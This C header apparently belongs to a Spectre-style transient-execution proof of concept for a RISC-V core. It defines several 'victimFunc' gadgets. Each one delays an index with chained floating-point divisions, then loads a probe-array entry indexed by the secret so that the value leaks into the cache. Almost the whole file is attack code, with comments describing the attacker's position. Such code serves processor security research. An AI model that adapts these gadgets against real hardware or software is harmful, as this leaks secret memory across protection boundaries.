#ifndef GADGET_H
#define GADGET_H

// Declare a global variable that prevents the compiler from optimizing out victimFunc_n().
uint8_t anchorVar = 0;

uint8_t shift_base = 2;
uint32_t tempArrayIndex = 1;
uint32_t tempArray[ARRAY_SIZE_FACTOR];

void victimFuncInit(uint32_t targetIdx)
{
/* Use a different index of tempArray to avoid effect of initial instruction cache miss.
 * Basically the form is kept the same as succeeding formal victimFunc since it is expected to simulate real scenes
 * where attacker has no access to valid address like targetIdx.
 */
	tempArray[0] = targetIdx;
    tempArrayIndex = tempArrayIndex << 4;
    asm("fcvt.s.wu fa4, %[in]\n"
        "fcvt.s.wu fa5, %[inout]\n"
        "fdiv.s fa5, fa5, fa4\n"        
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fcvt.wu.s %[out], fa5, rtz\n"
        : [out] "=r" (tempArrayIndex)
        : [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
        : "fa4", "fa5");
    tempArray[tempArrayIndex] = 0;
	anchorVar &= probeArray[guideArray[tempArray[0]] * ARRAY_STRIDE];
}

// Limited by nature of C language and current capability of RSD, the size of victimFunc array has to be static.
// Size of this array should be the same as SECRET_LENGTH in main body of the source code.
void (*victimFunc[])(uint32_t) = {
    victimFunc_00,
    victimFunc_01,
    victimFunc_02,
    victimFunc_03,
    victimFunc_04, 
};

void victimFunc_00(uint32_t targetIdx){

	tempArray[1] = targetIdx;

	tempArrayIndex = tempArrayIndex << 4;
	asm("fcvt.s.wu	fa4, %[in]\n"
		"fcvt.s.wu	fa5, %[inout]\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		// Adjust tempArrayIndex value and increase fdiv rows to improve accuracy.
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
}

void victimFunc_01(uint32_t targetIdx){

	tempArray[1] = targetIdx;

	tempArrayIndex = tempArrayIndex << 4;
	asm("fcvt.s.wu	fa4, %[in]\n"
		"fcvt.s.wu	fa5, %[inout]\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		// Adjust tempArrayIndex value and increase fdiv rows to improve accuracy.
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
}

void victimFunc_02(uint32_t targetIdx){

	tempArray[1] = targetIdx;

	tempArrayIndex = tempArrayIndex << 4;
	asm("fcvt.s.wu	fa4, %[in]\n"
		"fcvt.s.wu	fa5, %[inout]\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		// Adjust tempArrayIndex value and increase fdiv rows to improve accuracy.
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
}

void victimFunc_03(uint32_t targetIdx){

	tempArray[1] = targetIdx;

	tempArrayIndex = tempArrayIndex << 4;
	asm("fcvt.s.wu	fa4, %[in]\n"
		"fcvt.s.wu	fa5, %[inout]\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		// Adjust tempArrayIndex value and increase fdiv rows to improve accuracy.
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
}

void victimFunc_04(uint32_t targetIdx){

	tempArray[1] = targetIdx;

	tempArrayIndex = tempArrayIndex << 4;
	asm("fcvt.s.wu	fa4, %[in]\n"
		"fcvt.s.wu	fa5, %[inout]\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		"fdiv.s	fa5, fa5, fa4\n"
		// Adjust tempArrayIndex value and increase fdiv rows to improve accuracy.
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
//		"fdiv.s	fa5, fa5, fa4\n"
		"fcvt.wu.s	%[out], fa5, rtz\n"
		: [out] "=r" (tempArrayIndex)
		: [inout] "r" (tempArrayIndex), [in] "r" (shift_base)
		: "fa4", "fa5");

	tempArray[tempArrayIndex] = 0;
	// "Quickly" load that value from that memory location.
	anchorVar &= probeArray[guideArray[tempArray[1]] * ARRAY_STRIDE];
}

#endif